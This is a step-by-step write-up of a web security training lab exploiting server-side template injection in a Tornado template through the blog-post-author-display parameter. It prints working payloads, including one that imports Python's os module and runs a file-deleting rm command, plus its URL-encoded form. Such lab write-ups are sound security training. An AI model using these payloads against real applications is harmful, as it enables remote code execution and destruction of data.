Description:
This lab is vulnerable to Server-Side Template Injection (SSTI) due to unsafe usage of a Tornado template.

Steps to Solve:
1️-Identify the Injection Point
-Log in using:
wiener:peter
-Post a comment on any blog post.
-Go to My account page.
-Notice the preferred name feature:
-It sends a POST request with parameter:
blog-post-author-display
-Possible values:
user.name
user.first_name
user.nickname

2️-Intercept the Request
-In Burp Suite:
Go to Proxy → HTTP history
-Find:
POST /my-account/change-blog-post-author-display
-Send it to Repeater

3️-Test for SSTI
-Tornado template syntax:
{{ someExpression }}
-Inject payload:
user.name}}{{7*7}}
-After sending the request, reload your comment page.

-If you see:
Peter Wiener49}}

→ This confirms SSTI vulnerability.

4️-Achieve Remote Code Execution (RCE)
-Tornado allows executing Python code:
{% somePython %}
-Use Python os module:
os.system()

5️-Exploit the Vulnerability
-Payload:
{% import os %}
{{os.system('rm /home/carlos/morale.txt')}}

-URL-encoded payload:
user.name}}{%25+import+os+%25}{{os.system('rm%20/home/carlos/morale.txt')

-Insert into:
blog-post-author-display
Send the request via Burp Repeater.

6️-Trigger the Payload
-Reload the page containing your comment.

Result:
-Arbitrary Python code execution achieved
-File deleted:
-/home/carlos/morale.txt
